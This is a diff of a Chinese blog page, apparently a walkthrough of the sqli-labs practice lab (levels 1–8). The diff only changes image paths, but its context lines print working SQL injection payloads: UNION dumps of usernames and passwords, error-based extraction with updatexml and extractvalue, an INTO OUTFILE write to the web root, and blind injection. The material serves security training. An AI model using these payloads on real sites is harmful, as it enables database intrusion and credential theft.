@@ -81,32 +81,32 @@
 
 <p>当前表存在三列，则执行第三步，使用union联合语句：</p>
 <pre><code>/sqli-labs/Less-1/?id=0&#39; union select 1,2,3 --+ //显示Your Login name:2，Your Password:3</code></pre><p>第二第三列显示，则执行第四步，使用查询语句，查出库名、表名、列名后输出数据：</p>
-<pre><code>/sqli-labs/Less-1/?id=0&#39; union select 1,2,group_concat(username,password) from security.users --+ </code></pre><p><img src="1.png" alt=""></p>
+<pre><code>/sqli-labs/Less-1/?id=0&#39; union select 1,2,group_concat(username,password) from security.users --+ </code></pre><p><img src="/.com//1.png" alt></p>
 <hr>
 <h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>输入以下SQL语句：</p>
-<pre><code>/sqli-labs/Less-2/?id=1&#39; and 1=1</code></pre><p><img src="2.png" alt=""></p>
+<pre><code>/sqli-labs/Less-2/?id=1&#39; and 1=1</code></pre><p><img src="/.com//2.png" alt></p>
 <p>所以去掉单引号：</p>
 <pre><code>/sqli-labs/Less-2/?id=1&#39; and 1=1 --+ //显示正常</code></pre><p>所以通关语句为：</p>
-<pre><code>/sqli-labs/Less-2/?id=0 union select 1,2,group_concat(username,password) from security.users --+ </code></pre><p><img src="3.png" alt=""></p>
+<pre><code>/sqli-labs/Less-2/?id=0 union select 1,2,group_concat(username,password) from security.users --+ </code></pre><p><img src="/.com//3.png" alt></p>
 <hr>
 <h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>输入以下SQL语句：</p>
-<pre><code>/sqli-labs/Less-3/?id=1&#39; and 1=1</code></pre><p><img src="4.png" alt=""></p>
+<pre><code>/sqli-labs/Less-3/?id=1&#39; and 1=1</code></pre><p><img src="/.com//4.png" alt></p>
 <pre><code>/sqli-labs/Less-3/?id=1&#39; and 1=1 --+ //正常显示
 /sqli-labs/Less-3/?id=1&#39; and 1=2 --+ //正常显示，则说明1=2没有生效</code></pre><p>所以第三关与第二关的思路还是有区别的，此处多余的单引号可能不是添加，而是没闭合的单引号，所以添加单括号：</p>
 <pre><code>/sqli-labs/Less-3/?id=1&#39;) and 1=1 --+ //正常显示
 /sqli-labs/Less-3/?id=1&#39;) and 1=2 --+ //无显示</code></pre><p>所以通关语句为：</p>
-<pre><code>/sqli-labs/Less-3/?id=0&#39;) union select 1,2,group_concat(username,password) from security.users --+</code></pre><p><img src="5.png" alt=""></p>
+<pre><code>/sqli-labs/Less-3/?id=0&#39;) union select 1,2,group_concat(username,password) from security.users --+</code></pre><p><img src="/.com//5.png" alt></p>
 <hr>
 <h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p>输入以下SQL语句：</p>
 <pre><code>/sqli-labs/Less-4/?id=1&#39; and 1=1 //显示正常
 /sqli-labs/Less-4/?id=1&#39; and 1=2 //显示正常，1=2不起作用
 /sqli-labs/Less-4/?id=0&#39; or 1=1 --+ //无显示，or 1=1不起作用
 </code></pre><p>联想到php内不止单引号、括号，还有双引号：</p>
-<pre><code>/sqli-labs/Less-4/?id=1&quot; //终于有错误显示</code></pre><p><img src="6.png" alt=""><br>所以尝试以下语句：</p>
+<pre><code>/sqli-labs/Less-4/?id=1&quot; //终于有错误显示</code></pre><p><img src="/.com//6.png" alt><br>所以尝试以下语句：</p>
 <pre><code>/sqli-labs/Less-4/?id=1&quot;) and 1=1 --+ //显示正常
 /sqli-labs/Less-4/?id=1&quot;) and 1=2 --+ //无显示，说明and 1=2语句生效
 /sqli-labs/Less-4/?id=0&quot;) or 1=1 --+ //显示正常</code></pre><p>所以通关语句：</p>
-<pre><code>/sqli-labs/Less-4/?id=0&quot;) union select 1,2,group_concat(username,password) from security.users --+</code></pre><p><img src="7.png" alt=""></p>
+<pre><code>/sqli-labs/Less-4/?id=0&quot;) union select 1,2,group_concat(username,password) from security.users --+</code></pre><p><img src="/.com//7.png" alt></p>
 <hr>
 <h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p>第五关的思路：盲注<br>输入语句：</p>
 <pre><code>/sqli-labs/Less-5/?id=0&#39; and 1=1 --+ //无显示
@@ -121,7 +121,7 @@
 /sqli-labs/Less-5/?id=0&#39; and updatexml(1,concat( 0x7e,substr((select group_concat(username,password) from security.users),31,30),0x7e ),1) --+ //显示：XPATH syntax error: &#39;~mmyp@ssword,securecrappy,stupi~&#39;</code></pre><pre><code>/sqli-labs/Less-5/?id=1&#39; UNION SELECT 1, (SELECT 1 from (SELECT count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a),3 --+</code></pre><p>通过组合得出结果：<br>DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupi……</p>
 <hr>
 <h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h4><p>第六关的思路：盲注，只是使用双引号闭合<br>由于and构成判断的语句都输出：You are in………..<br>所以考虑盲注：</p>
-<pre><code>/sqli-labs/Less-6/?id=1&#39; and updatexml(1,concat(&quot;~&quot;,(select user()),&quot;~&quot;),1) --+</code></pre><p><img src="8.png" alt=""><br>会出现错误，所以使用双引号闭合：</p>
+<pre><code>/sqli-labs/Less-6/?id=1&#39; and updatexml(1,concat(&quot;~&quot;,(select user()),&quot;~&quot;),1) --+</code></pre><p><img src="/.com//8.png" alt><br>会出现错误，所以使用双引号闭合：</p>
 <pre><code>//使用count、floor和groud by联合的报错盲注
 /sqli-labs/Less-6/?id=1&quot; union  select 1,(select 1 from (select count(*),concat((select concat(username,&quot;~&quot;,password) from security.users limit 2,1),floor(rand(0)*2))x from information_schema.schemata group by x)a),3 --+  
 
@@ -131,7 +131,7 @@
 //关于extractvalue()函数的报错盲注
 /sqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,password) from users),1,30),&quot;~&quot;)) --+ </code></pre><hr>
 <h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><p>第七关的思路：使用into outfile<br>使用dumpfile下载数据到服务器上，路径设为网站的根目录下就可以查看。</p>
-<pre><code>/sqli-labs/Less-7/?id=1&#39;)) union select 1,username,password from security.users into outfile &#39;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\7.txt&#39; --+</code></pre><p><img src="9.png" alt=""></p>
+<pre><code>/sqli-labs/Less-7/?id=1&#39;)) union select 1,username,password from security.users into outfile &#39;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\7.txt&#39; --+</code></pre><p><img src="/.com//9.png" alt></p>
 <hr>
 <h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><p>第八关的思路：由于/sqli-labs/Less-8/?id=1’ and 1=1 –+显示；/sqli-labs/Less-8/?id=1’ and 1=2 –+无显示，所以结合if函数，当if为1时，显示，构建语句：</p>
 <pre><code>/sqli-labs/Less-8/?id=1&#39; and if(substr(database(),1,1)=&#39;s&#39;,1,0 ) --+</code></pre><hr>
@@ -240,7 +240,7 @@ Cookie: uname=admin&quot; union select 1,username,password from users limit 2,1#
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck4jwbl3j00009swrfbep2mby"
+      <a data-url="http://yoursite.com/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck4jx79zc000020wrasvo4yfl"
         class="article-share-link">Share</a>
       
     </footer>
